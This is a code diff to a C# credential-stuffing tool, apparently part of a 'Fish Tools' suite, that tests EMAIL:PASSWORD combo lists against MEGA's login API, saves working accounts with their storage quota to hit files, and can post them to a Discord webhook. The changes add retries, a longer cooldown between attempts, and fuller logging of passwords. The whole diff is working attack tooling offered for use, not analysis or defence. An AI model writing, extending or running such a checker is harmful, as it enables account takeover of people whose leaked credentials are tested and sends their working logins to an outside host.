@@ -18,7 +18,7 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
         private static readonly string HitsFile2 = "Result/MegaHits [email pass + Info].txt";
         private static bool UsingDiscord;
         private static string DiscordWebHook;
-        private const int CooldownTime = 350; 
+        private const int CooldownTime = 550; 
 
         public static void Main(Logger logger)
         {
@@ -26,8 +26,8 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
             Console.Title = "Fish Tools";
             logger.PrintArt();
 
-            File.WriteAllText(HitsFile, string.Empty);
-            File.WriteAllText(HitsFile2, string.Empty);
+            if (!File.Exists(HitsFile)) { File.Create(HitsFile).Close(); }
+            if (!File.Exists(HitsFile2)) { File.Create(HitsFile2).Close(); }
             logger.Info($"Place your combo inside \"{CombosFile}\" in format EMAIL:PASSWORD and press enter.");
             Console.ReadKey();
 
@@ -42,56 +42,80 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
         private async static Task CheckLogin(string email, string password, Logger logger)
         {
             var client = new MegaApiClient();
-            try
+            bool accountChecked = false;
+            int retryCount = 0;
+            const int maxRetries = 3;
+
+            while (!accountChecked && retryCount < maxRetries)
             {
-                client.Login(email, password);
-
-                if (client.IsLoggedIn)
+                try
                 {
-                    var accountInfo = client.GetAccountInformation();
-                    string usedSpace = (accountInfo.UsedQuota / 1073741824L).ToString();
-                    string totalSpace = (accountInfo.TotalQuota / 1073741824L).ToString();
+                    client.Login(email, password);
 
-                    string hitInfo2 = $"{email}:{password} | Used Space: {usedSpace}GB | Total Space: {totalSpace}GB";
-                    string hitInfo = $"{email}:{password}";
-
-                    if (UsingDiscord)
+                    if (client.IsLoggedIn)
                     {
-                        using (var httpClient = new HttpClient())
+                        var accountInfo = client.GetAccountInformation();
+                        string usedSpace = (accountInfo.UsedQuota / 1073741824L).ToString();
+                        string totalSpace = (accountInfo.TotalQuota / 1073741824L).ToString();
+
+                        string hitInfo2 = $"{email}:{password} | Used Space: {usedSpace}GB | Total Space: {totalSpace}GB";
+                        string hitInfo = $"{email}:{password}";
+
+                        if (UsingDiscord)
                         {
-                            var payload = new
+                            using (var httpClient = new HttpClient())
                             {
-                                content = hitInfo2,
-                                embeds = (object)null,
-                                attachments = new object[] { }
-                            };
+                                var payload = new
+                                {
+                                    content = hitInfo2,
+                                    embeds = (object)null,
+                                    attachments = new object[] { }
+                                };
 
-                            var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
-                            await httpClient.PostAsync(DiscordWebHook, content);
+                                var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
+                                await httpClient.PostAsync(DiscordWebHook, content);
+                            }
                         }
+                        logger.Success($"[Good] {hitInfo}");
+                        File.AppendAllText(HitsFile2, hitInfo2 + Environment.NewLine);
+                        File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
+                        accountChecked = true;
                     }
-                    logger.Success($"[Good] {hitInfo}");
-                    File.AppendAllText(HitsFile2, hitInfo2 + Environment.NewLine);
-                    File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
-                }
-                else
-                {
-                    logger.Error($"[Bad] {email}");
-                }
+                    else
+                    {
+                        logger.Error($"[Bad] {email}:{password}");
+                        accountChecked = true;
+                    }
 
-                int hitsCount = File.ReadLines(HitsFile).Count();
-                Console.Title = $"Fish Tools | Hits: {hitsCount}";
-            }
-            catch (Exception ex)
-            {
-                logger.Error($"[Bad] {email} | Error: {ex.Message}");
-            }
-            finally
-            {
-                if (client.IsLoggedIn)
-                {
-                    client.Logout();
+                    int hitsCount = File.ReadLines(HitsFile).Count();
+                    Console.Title = $"Fish Tools | Hits: {hitsCount}";
                 }
+                catch (Exception ex)
+                {
+                    if (ex.Message.Contains("ResourceNotExists"))
+                    {
+                        retryCount++;
+                        logger.Warn($"[Retry {retryCount}] {email}:{password} | Error: {ex.Message}. Retrying...");
+                        await Task.Delay(CooldownTime); 
+                    }
+                    else
+                    {
+                        logger.Error($"[Bad] {email}:{password} | Error: {ex.Message}");
+                        accountChecked = true;
+                    }
+                }
+                finally
+                {
+                    if (client.IsLoggedIn)
+                    {
+                        client.Logout();
+                    }
+                }
+            }
+
+            if (retryCount >= maxRetries)
+            {
+                logger.Error($"[Failed] {email}:{password} | Exceeded max retries.");
             }
         }
         private static async Task TestCombos(Logger logger)
@@ -103,7 +127,10 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
                 return;
             }
 
-            string[] combos = File.ReadAllLines(CombosFile);
+            string[] combos = File.ReadAllLines(CombosFile)
+                .Select(line => line.Trim()) 
+                .Where(line => !string.IsNullOrWhiteSpace(line))
+                .ToArray();
 
             if (combos.Length == 0)
             {
@@ -120,7 +147,9 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
                     var split = combo.Split(':');
                     if (split.Length == 2)
                     {
-                        await CheckLogin(split[0], split[1], logger);
+                        string email = split[0].Trim();
+                        string password = split[1].Trim();
+                        await CheckLogin(email, password, logger);
                     }
 
                     await Task.Delay(CooldownTime);
